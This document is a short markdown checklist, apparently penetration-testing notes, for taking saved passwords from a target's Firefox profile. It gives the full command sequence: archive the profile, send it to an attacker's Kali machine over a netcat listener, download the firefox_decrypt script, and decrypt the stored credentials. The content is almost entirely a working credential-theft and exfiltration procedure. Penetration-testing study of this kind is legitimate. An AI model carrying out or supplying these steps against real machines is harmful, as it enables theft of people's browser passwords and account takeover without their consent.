# Firefox

- [ ] Locate Firefox profile on the Target Machine
```
/home/hentaisalesman/.mozilla/firefox/xxxxxxxx.default
```

- [ ] Create tarball on the Target Machine
```
cd /home/hentaisalesman/.mozilla/
tar -zcvf firefox.tar.gz firefox
```

- [ ] Set up `nc` file receiver on your Kali Machine
```
nc -l -p 6969 > firefox.tar.gz
```

- [ ] Transfer file from the Target Machine to your Kali Machine
```
nc 192.168.xxx.xxx 6969 < firefox.tar.gz
```

- [ ] Extract tarball on your Kali Machine
```
tar -zxvf firefox.tar.gz
```

- [ ] Download Firefox Decrypt on your Kali Machine
```
wget https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py
```

- [ ] Decrypt the encrypted password on your Kali Machine
```
python3 firefox_decrypt.py firefox 
```

References
https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/credentials-from-password-stores/credentials-from-web-browsers
https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/browser-artifacts